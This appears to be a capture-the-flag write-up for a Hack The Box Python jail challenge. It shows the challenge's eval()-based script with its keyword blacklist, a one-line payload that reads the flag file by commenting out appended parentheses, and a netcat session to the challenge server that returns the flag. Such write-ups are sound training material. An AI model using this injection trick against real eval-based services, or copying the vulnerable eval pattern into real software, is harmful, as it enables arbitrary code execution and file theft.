# Unbreakable

> Think you can escape my grasp? Challenge accepted! I dare you to try and break free, but beware, it won't be easy. I'm ready for whatever tricks you have up your sleeve!
> 
> Files:
> - [flag.txt](misc_unbreakable/challenge/flag.txt) | [main.py](misc_unbreakable/challenge/main.py)

**Writeup by:** Stig Rune Grønnestad

- [Unbreakable](#unbreakable)
	- [Recon](#recon)
	- [Solver](#solver)
	- [Executing](#executing)
	- [Flag](#flag)

## Recon

Python script, let's take a look at it.

```python
blacklist = [ ';', '"', 'os', '_', '\\', '/', '`',
              ' ', '-', '!', '[', ']', '*', 'import',
              'eval', 'banner', 'echo', 'cat', '%', 
              '&', '>', '<', '+', '1', '2', '3', '4',
              '5', '6', '7', '8', '9', '0', 'b', 's', 
              'lower', 'upper', 'system', '}', '{' ]

while True:
  ans = input('Break me, shake me!\n\n$ ').strip()
  
  if any(char in ans for char in blacklist):
    print(f'\n{banner1}\nNaughty naughty..\n')
  else:
    try:
      eval(ans + '()')
      print('WHAT WAS THAT?!\n')
    except:
      print(f"\n{banner2}\nI'm UNBREAKABLE!\n") 
```

The script takes input, checks if it contains any of the characters in the `blacklist`, and if it does, it prints `Naughty naughty..`. If it doesn't, it tries to evaluate the input as a function, and if it fails, it prints `I'm UNBREAKABLE!`. The `eval` function appends `()` to the input, so we need to input a function name without parentheses... or maybe we can comment it out?

## Solver

```python
print(open('flag.txt','r').read())#
```

## Executing
```bash
└─$ nc 94.237.59.119 59639
Break me, shake me!

$ print(open('flag.txt','r').read())#
HTB{3v4l_0r_3vuln??}

WHAT WAS THAT?!

Break me, shake me!

$
```

## Flag

`HTB{3v4l_0r_3vuln??}`
